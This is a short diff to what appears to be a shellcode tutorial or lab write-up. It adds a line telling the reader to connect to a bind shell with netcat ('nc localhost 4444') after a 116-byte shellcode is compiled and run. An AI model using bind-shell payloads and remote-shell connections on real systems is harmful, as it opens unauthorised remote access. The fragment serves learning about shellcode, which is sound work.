@@ -35,6 +35,8 @@ Run the compiled binary:
 Shellcode Length: 116
 ```
 
+Connect to the bind shell over the chosen port using netcat:
+
 ```bash
 nc localhost 4444                                                                                                                           1 ⨯
 hostname
